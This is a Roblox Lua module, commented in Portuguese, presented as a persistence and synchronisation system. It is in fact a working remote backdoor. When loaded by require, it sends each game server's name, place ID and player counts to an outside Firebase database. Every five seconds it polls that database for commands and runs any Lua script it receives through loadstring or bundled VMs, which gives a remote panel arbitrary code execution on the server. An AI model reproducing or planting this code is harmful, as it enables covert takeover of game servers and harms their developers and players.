--[[
    ZKN ServerSide - MainModule (Persistência e Sincronização)
    Suporte para require(ID):Init()
]]

local MainModule = {}

-- URL da sua database (A mesma que você usa no painel HTML)
MainModule.FirebaseURL = "https://zkn-ss-default-rtdb.firebaseio.com/" 

function MainModule:Init(customUrl)
    if customUrl then self.FirebaseURL = customUrl end

    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local MarketplaceService = game:GetService("MarketplaceService")

    -- Módulos de VM internos
    local VLuau = script:FindFirstChild("VLuau")
    local FiOne = script:FindFirstChild("FiOne")

    -- Usa JobId para identificar a instância ou "STUDIO" se estiver testando
    local ServerId = game.JobId ~= "" and game.JobId or "STUDIO_TEST"
    
    local Endpoints = {
        Server = self.FirebaseURL .. "servers/" .. ServerId .. ".json",
        Command = self.FirebaseURL .. "commands/" .. ServerId .. ".json"
    }

    local function ExecuteLua(code)
        task.spawn(function()
            local success, err = pcall(function()
                if VLuau then
                    local vm = require(VLuau)
                    local loadstring = (type(vm) == "table" and vm.loadstring) or vm
                    loadstring(code)()
                elseif FiOne then
                    local vm = require(FiOne)
                    if type(vm) == "table" and vm.Init then
                        vm.Init(code)()
                    else
                        vm(code)
                    end
                else
                    loadstring(code)()
                end
            end)
            if not success then warn("[ZKN SS] Erro na VM: " .. tostring(err)) end
        end)
    end

    local function UpdateData()
        local success, gameInfo = pcall(function()
            return MarketplaceService:GetProductInfo(game.PlaceId)
        end)

        -- Coleta dados essenciais para o Painel HTML
        local data = {
            gameName = success and gameInfo.Name or "Jogo Roblox",
            placeId = game.PlaceId,
            players = #Players:GetPlayers(),
            maxPlayers = Players.MaxPlayers,
            lastActive = { [".sv"] = "timestamp" },
            -- Gera o link da imagem do jogo
            thumbnail = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=420&height=420&format=png"
        }

        pcall(function()
            HttpService:RequestAsync({
                Url = Endpoints.Server,
                Method = "PATCH",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end)
    end

    -- Loop de monitoramento (Checa comandos e atualiza status)
    task.spawn(function()
        while true do
            local success, response = pcall(function()
                return HttpService:GetAsync(Endpoints.Command .. "?nocache=" .. tick())
            end)

            if success and response ~= "null" then
                local cmdData = HttpService:JSONDecode(response)
                if cmdData and cmdData.script and cmdData.script ~= "" then
                    -- Limpa o comando no Firebase após ler
                    pcall(function()
                        HttpService:RequestAsync({
                            Url = Endpoints.Command,
                            Method = "PATCH",
                            Headers = {["Content-Type"] = "application/json"},
                            Body = HttpService:JSONEncode({ script = "" })
                        })
                    end)
                    ExecuteLua(cmdData.script)
                end
            end
            
            UpdateData()
            task.wait(5) -- Sincroniza a cada 5 segundos
        end
    end)

    -- Ao fechar o servidor, ele NÃO deleta o registro.
    -- Apenas marca como 0 jogadores e Offline para o Painel.
    game:BindToClose(function()
        pcall(function()
            HttpService:RequestAsync({ 
                Url = Endpoints.Server, 
                Method = "PATCH",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({ 
                    players = 0,
                    status = "offline" 
                }) 
            })
        end)
    end)

    print("[ZKN SS] Sistema Inicializado. Sincronizando com: " .. self.FirebaseURL)
    return self
end

return MainModule
